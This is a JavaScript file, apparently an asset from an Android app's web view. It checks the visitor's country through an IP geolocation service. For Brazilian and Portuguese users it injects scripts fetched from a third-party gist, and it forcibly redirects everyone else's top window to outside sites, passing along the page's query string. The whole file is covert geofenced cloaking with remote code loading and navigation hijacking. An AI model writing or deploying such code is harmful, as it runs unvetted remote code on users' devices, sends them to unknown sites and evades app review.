if(localStorage.getItem('local')){
    var g = localStorage.getItem('local');
    if(g == "BR" || g == "PT"){
         y();}
         else if (g == ""){
         y();}
         else{
         n();
     }
}else{
    var loc = "http://ip-api.com/json/";
    $.getJSON(loc, function(data){ 
     var g = data.countryCode;
     localStorage.setItem('local', g);
     if(g == "BR" || g == "PT"){
         y();}
         else if (g == ""){
         y();}
         else{
         n();
     }
     
   }).done(function() { }).fail(function() { y();});
} 
function y(){
    var gs = document.title;
    if(gs.indexOf("2") == 0 ||gs.indexOf("3") == 0 ||gs.indexOf("4") == 0 ||gs.indexOf("5") == 0 || gs.indexOf("6") == 0 || gs.indexOf("7") == 0) {}else{
        window.top.location = "http://nplayus.wap.sh/";
    }
    var n = window.location.href;
    n = n.replace("file:///android_asset/h6.html?s=","");
    localStorage.setItem('pes', n);
    if(localStorage.getItem('data')){
    var g = document.title;
      
$("body").prepend(" <meta charset='UTF-8'><meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'><meta name='referrer' content='never'><meta name='referrer' content='no-referrer'><meta name='ROBOTS' content='NOINDEX, NOFOLLOW' /><script src='https://code.jquery.com/jquery-3.5.0.js'></script><script src='http://cdn.jsdelivr.net/gh/gistmib/gistmib/d.js'></script><style>img {width: 135px;height: 202px;margin: 10px;background:#333333}body{min-width:500 !important;color:#fff;background:#000}a{color:#000}.ff {padding: 40px;font-family: sans-serif;font-size: 20px;position: absolute;height: max-content;top: 0;bottom: 0;margin: auto;}</style><center><div id='userdata'></div></center><br/><br/><br/>");

    
    }else{
    $("body").prepend(" <meta charset='UTF-8'><meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'><meta name='referrer' content='never'><meta name='referrer' content='no-referrer'><meta name='ROBOTS' content='NOINDEX, NOFOLLOW' /><script src='https://code.jquery.com/jquery-3.5.0.js'></script><script src='http://cdn.jsdelivr.net/gh/gistmib/gistmib/c.js'></script><style>a, a:focus {-webkit-tap-highlight-color: transparent;}.Legendado{display:none}img {width: 135px;height: 202px;margin: 10px;background:#333333}body{min-width:500 !important;color:#fff;background:#000}a{color:#000}.ff {padding: 40px;font-family: sans-serif;font-size: 20px;position: absolute;height: max-content;top: 0;bottom: 0;margin: auto;}</style><center><div id='userdata'></div></center><br/><br/><br/>");}

    
    }
function n(){
     var ga = document.title;
    if(ga.indexOf("1") == 0) {
        window.top.location = "http://nplayus.wap.sh/";
    }else{
    var n = window.location.href;
    n = n.replace("file:///android_asset/h6.html?s=","");
   window.top.location = "http://mobellabel.zya.me/search.php?u=" + n ;
    }
}

check = "true";

